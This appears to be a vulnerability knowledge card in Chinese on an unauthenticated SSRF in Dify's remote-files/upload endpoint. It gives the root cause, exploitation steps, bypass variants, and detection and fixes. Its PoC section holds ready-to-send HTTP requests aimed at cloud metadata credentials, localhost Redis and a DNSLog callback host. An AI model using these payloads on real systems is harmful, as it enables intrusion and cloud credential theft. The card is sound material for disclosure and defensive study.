---
id: web-generic-ssrf-dify-remote-files-upload-unauth
title: Dify <= 1.16.1 未授权 SSRF：remote-files/upload 在登录校验前拉取任意 URL
type: scenario
domain: web
path: web/generic/ssrf
technique: dify-unauth-ssrf-remote-file-upload
aliases:
- Dify 未授权 SSRF
- Dify remote-files/upload SSRF
- Dify 装饰器顺序 SSRF
- CVE-2025-29720 同类
- CVE-2025-56520 同类
- 文件远程上传 SSRF
tags:
- dify
- ssrf
- unauthenticated
- flask-restx
- decorator-order
- cloud-metadata
- redis
- dnslog
- ai-platform
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Dify <= 1.16.1
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:41:51+08:00'
  notes: 已对照原文与图01/02核对：装饰器顺序、upload_remote_file_from_request 先 HEAD 后 GET、仅识别 Squid 的防护、错误回显 url+resp.text 均与原文一致；图02 显示无认证请求触发 ssrf-test DNSLog 解析并返回 400，支持“未授权已出站”；云元数据/内网实际读取未验证（原文亦无截图）。版本原文标题写 1.6.1、正文影响版本写 <=1.16.1，卡片采用原文影响版本标记 Dify <= 1.16.1，已设 versions。根因中的 Flask-RESTX 装饰器执行顺序解释为原文判断，未独立审计 Dify 源码；PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

Dify 1.16.1 及更早版本的 `POST /console/api/remote-files/upload` 由于 Flask-RESTX 的 payload 解析/模型校验先于 `@login_required` 生效，未登录攻击者只要提交 `{"url":"..."}` 就能让服务端在返回 401 之前完成对任意 URL 的 HEAD/GET 请求；配合仅识别 Squid 的 SSRF 防护缺口，可探测内网、访问云元数据与 localhost 服务，错误信息还会回显目标 URL 与响应正文。

## 原理

- 路由类 `RemoteFileUpload` 的装饰器顺序为 `@console_ns.expect(...)`、`@console_ns.response(...)`、`@login_required`、`@with_current_user`。Flask-RESTX 会在进入视图函数前解析并校验请求体，`RemoteFileUploadPayload.model_validate()` 不等待登录检查。
- `upload_remote_file_from_request()` 在认证检查真正阻断请求之前被调用：它从 payload 取 `url`，先向该 URL 发 `HEAD`；若状态码不是 200，再发 `GET`（`timeout=3, follow_redirects=True`）。因此 SSRF 请求已经在服务端发出，之后才因未登录返回 401。
- 防护函数只识别 Squid 代理：当响应为 401/403 且 `Server`/`Via` 头包含 `squid` 时才判定为 SSRF 拦截。没有部署 Squid、使用其他代理或直连时，私有/回环/link-local 地址不会被拦截。
- 失败分支把 `url` 和 `resp.text` 拼进错误信息（`Failed to fetch file from {url}: {resp.text}`），因此目标返回非 200 时，响应正文会随错误回显给未认证请求者，形成有回显的 SSRF 读取；DNS 侧也能用 DNSLog 确认请求已发出。
- 该端点此前已有 CVE-2025-29720、CVE-2025-56520 等同地址问题，说明修复未覆盖认证顺序与 URL 校验的组合缺陷。

## 触发条件

- 目标为 Dify <= 1.16.1（原文影响版本标记；标题写作 1.6.1）。
- `/console/api/remote-files/upload` 可从攻击者网络访问，且请求不需要有效会话即可进入 payload 解析。
- 服务端未部署 Squid 代理，或 SSRF 防护仅依赖 Squid 的 401/403 响应。
- 目标 URL 使用 http/https，服务端可出站（访问内网、云元数据或攻击者控制的 DNSLog）。

## 利用步骤

1. 确认目标 Dify 版本与端点可达：`POST /console/api/remote-files/upload`。
2. 用 DNSLog/外部 HTTP 服务作为 URL，提交 `{"url":"http://<unique>.dnslog.cn/"}`，观察 DNS 查询或 HTTP 请求确认 SSRF 已触发（即使响应是 401/400）。
3. 将 URL 换成 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 探测云元数据；或 `http://localhost:6379/`、内网管理地址探测本机/内网服务。
4. 利用错误回显读取非 200 响应正文；对返回 200 的目标，按上传流程观察是否落盘并返回签名 URL（受后续认证检查影响）。
5. 授权测试中只访问自有 DNSLog/靶机，不读取真实云凭据；记录请求时间、响应码与 DNS 记录作为证据。

## PoC

```http
POST /console/api/remote-files/upload HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 45

{"url":"http://httpbin.org/ip"}
```

```http
POST /console/api/remote-files/upload HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 85

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

```http
POST /console/api/remote-files/upload HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 40

{"url":"http://localhost:6379/"}
```

```http
POST /console/api/remote-files/upload HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 52

{"url":"http://ssrf-test.<your>.dnslog.cn/"}
```

无需 Cookie。DNSLog 实测返回 400 `{"code":"invalid_param","message":"Reached maximum retries (3) for URL ..."}`，同时 DNSLog 记录到解析，证明请求在认证失败前已经发出。

## 变体与关联

- 变体：目标换成云厂商元数据（AWS/GCP/阿里云/腾讯云）、K8s API、Docker API、Redis/Memcached、内网 HTTP 管理面板。
- 变体：利用 `follow_redirects=True` 先访问攻击者控制的 302，再跳转到内网地址，绕过只检查初始 URL 的逻辑。
- 变体：用 DNS 重绑定（第一次解析公网、第二次解析内网）绕过基于解析结果的校验。
- 关联卡片：[[cloud-metadata]]（SSRF 读云元数据获取临时凭证）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（SSRF 打 Redis）、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（解析器差异绕过）。
- 关联：Dify 代码节点沙箱网络访问卡（同一产品的另一个网络边界问题）。

## 检测与防御

- 修复：把 `@login_required`、`@account_initialization_required` 等认证装饰器放到 payload 解析/业务处理之前，确保未认证请求在解析 URL 前被拒绝；不要依赖装饰器声明顺序的表面语义，需验证 Flask-RESTX 实际执行顺序。
- 修复：在 `upload_remote_file_from_request` 内做 URL 安全校验：仅允许 http/https，解析并拒绝 private/loopback/link-local/保留地址与云元数据地址，限制端口，禁用或重新校验重定向，解析后再检查一次 IP（防 DNS rebinding）。
- 修复：不要只依赖 Squid 的 401/403 响应做 SSRF 防护；无代理或其他代理环境下必须有应用层校验。
- 加固：出站网络默认拒绝，使用白名单代理；元数据服务启用 IMDSv2/最小权限；不要把响应正文拼进错误信息，避免有回显读取。
- 检测：未认证请求命中 `/console/api/remote-files/upload` 后出现异常出站连接/DNS 查询；错误日志中出现 `Failed to fetch file from` 且 URL 指向内网/元数据/DNSLog；同一 IP 短时间内提交多个不同 URL。
- 响应：封禁来源 IP，检查出站连接与云凭据使用记录，轮换可能泄露的临时凭证，升级到修复版本。
